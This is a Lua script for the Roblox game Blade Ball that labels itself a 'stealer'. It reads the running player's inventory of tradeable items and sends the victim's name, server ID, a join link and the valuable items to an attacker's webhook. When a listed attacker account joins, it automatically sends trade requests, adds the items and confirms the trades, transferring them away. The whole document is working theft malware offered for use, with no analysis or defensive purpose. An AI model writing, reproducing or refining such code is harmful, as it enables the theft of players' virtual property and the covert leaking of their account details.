-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local auth_token = "EBK-SS-A" 
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // CONFIGURATION
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // FONCTION D'ENVOI POUR TON WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // RÉCUPÉRATION DATA
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

-- // SCAN DE L'INVENTAIRE
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for itemId, itemInfo in pairs(clientInventory[cat]) do
            if not itemInfo.TradeLock then
                local rap = 0
                pcall(function()
                    for key, value in pairs(rapData[cat]) do
                        if string.find(key, itemInfo.Name) then rap = value break end
                    end
                end)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = cat, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // FONCTION DE GROUPAGE (Pour l'affichage x1, x2...)
local function getGroupedList(list)
    local total = 0
    local grouped = {}
    for _, item in ipairs(list) do
        total = total + item.RAP
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end
    local sorted = {}
    for _, v in pairs(grouped) do table.insert(sorted, v) end
    table.sort(sorted, function(a, b) return a.TotalRAP > b.TotalRAP end)
    
    local text = ""
    for _, g in ipairs(sorted) do
        text = text .. string.format("%s (x%d) - **%s RAP**\n", g.Name, g.Count, formatNumber(g.TotalRAP))
    end
    return text, total
end

-- // WEBHOOK 1 : JOIN MESSAGE (GOOD/SMALL HIT)
local function SendJoinMessage()
    local itemText, totalRAP = getGroupedList(itemsToSend)
    local isGood = totalRAP >= 500
    
    local payload = {
        ["auth_token"] = auth_token,
        ["username"] = isGood and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = (ping == "Yes" and "--[[@everyone]]\n" or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = isGood and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
            ["color"] = isGood and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "JobId 🆔:", value = "```" .. game.JobId .. "```", inline = true},
                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list 📝:", value = itemText ~= "" and itemText or "Aucun item de valeur", inline = false},
                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(payload)
end

-- // WEBHOOK 2 : SERVER HIT (QUAND TU REJOINS)
local function SendServerHit()
    local itemText, totalRAP = getGroupedList(itemsToSend)
    local isGood = totalRAP >= 500

    local payload = {
        ["auth_token"] = auth_token,
        ["username"] = isGood and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)",
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎯",
            ["color"] = isGood and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "Status 📈:", value = isGood and "🟢 GOOD HIT" or "🟣 SMALL HIT", inline = true},
                {name = "Items to Steal 📝:", value = itemText ~= "" and itemText or "None", inline = false},
                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(payload)
end

-- // LOGIQUE DE TRADE
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local inTrade = false
PlayerGui.Trade:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = PlayerGui.Trade.Enabled end)

local function startTrade(targetPlayer)
    SendServerHit()
    task.spawn(function()
        while #itemsToSend > 0 do
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
            local t = 0
            repeat task.wait(0.5); t = t + 0.5 until inTrade or t > 20
            if not inTrade then continue end

            local currentBatch = {}
            for i = 1, math.min(100, #itemsToSend) do table.insert(currentBatch, table.remove(itemsToSend, 1)) end
            for _, item in ipairs(currentBatch) do
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            end

            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.3)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.5) until not inTrade
        end
    end)
end

-- // EXECUTION FINALE
if #itemsToSend > 0 then
    SendJoinMessage() -- Envoi direct au début

    local function check(p)
        if table.find(users, p.Name) then startTrade(p) end
    end

    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
